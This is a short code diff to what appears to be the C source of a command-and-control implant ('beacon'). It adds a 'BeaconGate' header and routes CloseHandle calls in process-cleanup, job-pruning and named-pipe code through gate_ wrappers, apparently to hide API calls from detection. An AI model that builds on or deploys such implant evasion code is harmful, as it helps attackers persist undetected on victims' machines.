@@ -2,6 +2,7 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <windows.h>
+#include "beacon_gate.h" /* BeaconGate: gate_* = the API with the gate in front */
 
 #include "beacon.h"
 #include "tokens.h"
@@ -16,10 +17,10 @@ static DWORD       jids     = 0;
 
 void cleanupProcess(PROCESS_INFORMATION  * pi) {
 	if (pi->hProcess != INVALID_HANDLE_VALUE && pi->hProcess != 0)
-		CloseHandle(pi->hProcess);
+		gate_CloseHandle(pi->hProcess);
 
 	if (pi->hThread != INVALID_HANDLE_VALUE && pi->hThread != 0)
-		CloseHandle(pi->hThread);
+		gate_CloseHandle(pi->hThread);
 }
 
 
@@ -101,15 +102,15 @@ void psh_prune_list() {
 		if (temp->status == JOB_STATUS_DEAD) {
 			/* kill our process */
 			if (temp->tag == JOB_ENTRY_PROCESS) {
-				CloseHandle(temp->pi.hProcess);
-				CloseHandle(temp->pi.hThread);
-				CloseHandle(temp->read_stdout);
-				CloseHandle(temp->write_stdout);
+				gate_CloseHandle(temp->pi.hProcess);
+				gate_CloseHandle(temp->pi.hThread);
+				gate_CloseHandle(temp->read_stdout);
+				gate_CloseHandle(temp->write_stdout);
 			}
 			/* shutdown our named pipe instead */
 			else if (temp->tag == JOB_ENTRY_NAMEDPIPE) {
 				DisconnectNamedPipe(temp->read_stdout);
-				CloseHandle(temp->read_stdout);
+				gate_CloseHandle(temp->read_stdout);
 			}
 		}
 		temp = (psh_entry*)temp->next;
@@ -373,7 +374,7 @@ BOOL _connect_pipe_level(char * pipename, HANDLE * pipe, DWORD level) {
 
 	if (!status) {
 		DisconnectNamedPipe(*pipe);
-		CloseHandle(*pipe);
+		gate_CloseHandle(*pipe);
 
 		return FALSE;
 	}
